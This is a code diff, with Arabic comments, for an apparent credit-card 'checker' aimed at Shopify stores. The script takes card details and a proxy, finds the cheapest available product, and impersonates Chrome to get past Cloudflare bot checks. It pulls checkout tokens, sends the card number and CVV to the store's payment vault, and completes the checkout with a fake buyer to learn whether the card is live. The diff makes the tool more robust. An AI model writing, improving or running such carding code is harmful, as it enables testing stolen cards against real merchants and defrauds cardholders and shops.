@@ -21,38 +21,55 @@ def safe_response(msg, price, gate):
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": clean_msg, "Price": clean_price, "Gate": gate}
 
-async def get_micro_product(session, store_url):
+async def get_optimal_product(session, store_url):
+    """محرك شامل يسحب المنتج الرخيص، وإن لم يجد يسحب الأرخص مطلقاً ولا يوقف العملية"""
     endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
+    all_variants = []
+    
     for ep in endpoints:
         try:
             res = await session.get(ep, headers={"Accept": "application/json"}, timeout=15)
             if res.status_code == 200:
                 products = res.json().get('products', [])
-                valid = []
                 for prod in products:
                     for var in prod.get('variants', []):
                         if var.get('available'):
                             try:
                                 p = float(var.get('price', 0))
                                 if p > 10000: p = p / 100.0
-                                if 0.1 <= p <= 150.0: valid.append((var.get('id'), p))
+                                if p > 0: all_variants.append((var.get('id'), p))
                             except: pass
-                if valid:
-                    valid.sort(key=lambda x: x[1])
-                    return str(valid[0][0]), "{:.2f}".format(valid[0][1])
         except: continue
+        if all_variants: break
+
+    # إذا وجدنا منتجات عبر API
+    if all_variants:
+        all_variants.sort(key=lambda x: x[1])
+        # البحث عن منتج رخيص أولاً
+        best_variant = all_variants[0]
+        for vid, price in all_variants:
+            if 0.1 <= price <= 150.0:
+                best_variant = (vid, price)
+                break
+        return str(best_variant[0]), "{:.2f}".format(best_variant[1])
+
+    # الخطة البديلة (Fallback): استخراج Product ID من HTML الموقع لو الـ API مغلق
+    try:
+        html_res = await session.get(store_url, timeout=15)
+        matches = re.findall(r'variant[s]?["\']?\s*:\s*\[?.*?["\']?id["\']?\s*:\s*(\d+)', html_res.text, re.IGNORECASE)
+        if matches:
+            return str(matches[0]), "Unknown"
+    except: pass
+
     return None, "-"
 
 def extract_advanced_tokens(html, url):
-    """حفار جزيئي يستخرج التوكن من الـ HTML، والميتا، والـ JSON، والرابط"""
     is_graphql = False
     session_token, classic_token, checkout_token = None, None, None
 
-    # 1. استخراج Checkout Token من الرابط بشكل صارم
     ct_match = re.search(r'/checkouts/(?:cn|c|unstable|c/graphql)/([^/?]+)', url)
     if ct_match: checkout_token = ct_match.group(1)
 
-    # 2. استخراج Session Token (خاص بنظام Extensibility و Remix)
     st_meta = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html)
     st_json = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']+)["\']', html)
     
@@ -63,7 +80,6 @@ def extract_advanced_tokens(html, url):
         session_token = st_json.group(1)
         is_graphql = True
 
-    # 3. استخراج Classic Token للنظام القديم
     patterns = [
         r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']',
         r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']',
@@ -93,20 +109,19 @@ async def check_shopify_terminal(cc_info, store_url, proxy):
             "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001", "country": "US", "phone": "2125551234"
         }
 
-        # استخدام بصمة chrome120 مع تعطيل ALPN/HTTP2 لتخطي الفحص الدقيق لكلاودفلير
         async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60, http_version=1) as session:
             
-            # 1. سحب المنتج
-            variant_id, price = await get_micro_product(session, store_url)
-            if not variant_id: return safe_response("No micro-priced product found", "-", "Shopify Terminal")
+            # 1. سحب المنتج بالذكاء الشامل
+            variant_id, price = await get_optimal_product(session, store_url)
+            if not variant_id: return safe_response("Store has no accessible products", "-", "Shopify Terminal")
 
-            # 2. الإضافة للسلة (AJAX)
+            # 2. الإضافة للسلة
             add_res = await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers={"X-Requested-With": "XMLHttpRequest"})
             if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify Terminal")
 
             await asyncio.sleep(0.5)
 
-            # 3. تخطي كلاودفلير عبر إرسال Form POST لإنشاء الـ Checkout (الطريقة البشرية)
+            # 3. تخطي كلاودفلير وتوليد جلسة دفع
             chk_headers = {
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -117,12 +132,11 @@ async def check_shopify_terminal(cc_info, store_url, proxy):
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
-            # فحص حظر WAF
             if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                 return safe_response("Cloudflare WAF Blocked IP", price, "Shopify Terminal")
             
             if "/cart" in final_url and "/checkout" not in final_url:
-                return safe_response("Cart Blocked (Item Removed)", price, "Shopify Terminal")
+                return safe_response("Cart Blocked (Item Removed by Site)", price, "Shopify Terminal")
 
             # 4. الرادار الجزيئي للتوكن
             is_graphql, session_token, classic_token, checkout_token = extract_advanced_tokens(html_chk, final_url)
@@ -132,17 +146,16 @@ async def check_shopify_terminal(cc_info, store_url, proxy):
                 page_title = title.group(1).strip() if title else "Unknown"
                 return safe_response(f"Token Extractor Failed ({page_title[:15]})", price, "Shopify Terminal")
 
-            # 5. تشفير البطاقة (PCI Vault)
+            # 5. تشفير البطاقة
             pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
             res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
             if res_pci.status_code != 200: return safe_response("Stripe PCI Blocked IP", price, "Shopify Terminal")
             card_session_id = res_pci.json().get("id")
 
             # =================================================================
-            # المسار الأول: GraphQL Extensibility (Shopify 2025) - [From neww.py]
+            # المسار الأول: GraphQL Extensibility
             # =================================================================
             if is_graphql:
-                # إذا فشل في استخراج checkout_token من الرابط، نعطيه قيمة افتراضية لتفادي الانهيار
                 if not checkout_token: checkout_token = "unknown"
 
                 gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
@@ -190,7 +203,7 @@ async def check_shopify_terminal(cc_info, store_url, proxy):
                 return safe_response("Timeout waiting for Bank", price, "Shopify Terminal (GQL)")
             
             # =================================================================
-            # المسار الثاني: Classic HTML (Shopify Legacy)
+            # المسار الثاني: Classic HTML
             # =================================================================
             else:
                 addr_payload = {"_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method", "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"], "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"], "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]}
